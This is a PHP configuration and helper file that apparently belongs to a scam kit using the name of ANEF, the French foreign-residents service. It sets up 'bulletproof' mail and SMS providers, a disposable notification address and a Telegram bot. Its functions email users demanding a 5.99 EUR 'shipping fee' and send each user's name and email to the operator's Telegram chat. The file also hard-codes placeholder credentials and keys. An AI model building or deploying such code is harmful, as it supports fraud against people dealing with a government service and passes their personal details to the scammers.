<?php
// Database configuration
define('DB_HOST', 'localhost');
define('DB_NAME', 'anef_project');
define('DB_USER', 'anef_user');
define('DB_PASS', 'secure_password_123');
define('DB_CHARSET', 'utf8mb4');

// SMTP Configuration
define('SMTP_HOST', 'smtp.bulletproofmail.com');
define('SMTP_PORT', 587);
define('SMTP_USERNAME', 'anef@yourdomain.com');
define('SMTP_PASSWORD', 'bulletproof_smtp_pass');
define('SMTP_SECURE', 'tls');
define('SMTP_FROM_EMAIL', 'anef@yourdomain.com');
define('SMTP_FROM_NAME', 'ANEF Project');

// Telegram Configuration
define('TELEGRAM_BOT_TOKEN', '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz12345678901234567890');
define('TELEGRAM_CHAT_ID', '987654321');

// Payment Configuration
define('SHIPPING_FEE', 5.99);
define('CURRENCY', 'EUR');

// Email for shipping notifications
define('SHIPPING_EMAIL', 'o83ljo2tfd@ruutukf.com');

// Admin panel access
define('ADMIN_ACCESS_KEY', 'super_secret_admin_key_456');

// Security settings
define('ENCRYPTION_KEY', 'a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6');

// SMS Configuration
define('SMS_API_KEY', 'sms_bulletproof_api_key_789');
define('SMS_GATEWAY', 'https://api.sms-bulletproof.com/send');

// Database connection
try {
    $pdo = new PDO(
        'mysql:host=' . DB_HOST . ';dbname=' . DB_NAME . ';charset=' . DB_CHARSET,
        DB_USER,
        DB_PASS,
        [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
            PDO::ATTR_EMULATE_PREPARES => false,
        ]
    );
} catch (PDOException $e) {
    die('Database connection failed: ' . $e->getMessage());
}

// SMTP Connection
function send_smtp_email($to, $subject, $body, $headers = []) {
    global $pdo;
    
    $email_data = [
        'to' => $to,
        'subject' => $subject,
        'body' => $body,
        'headers' => json_encode($headers),
        'sent_at' => date('Y-m-d H:i:s')
    ];
    
    $stmt = $pdo->prepare("INSERT INTO emails (to_email, subject, body, headers, sent_at) VALUES (?, ?, ?, ?, ?)");
    return $stmt->execute([$email_data['to'], $email_data['subject'], $email_data['body'], $email_data['headers'], $email_data['sent_at']]);
}

// Telegram notification function
function send_telegram_notification($message) {
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 30
    ];
    
    $ch = curl_init();
    curl_setopt_array($ch, $options);
    $result = curl_exec($ch);
    curl_close($ch);
    
    return $result;
}

// Send shipping fee notification
function notify_shipping_fee($user_email, $user_name, $amount = SHIPPING_FEE) {
    $subject = "ANEF Project - Shipping Fee Notification";
    $body = "Dear {$user_name},\n\nYour order requires a shipping fee of {$amount} EUR. Please complete the payment to proceed with your order.\n\nThank you for your cooperation.\n\nANEF Team";
    
    send_smtp_email($user_email, $subject, $body);
    send_smtp_email(SHIPPING_EMAIL, $subject, $body);
    send_telegram_notification("Shipping fee notification sent to {$user_name} ({$user_email}) - Amount: {$amount} EUR");
}
?>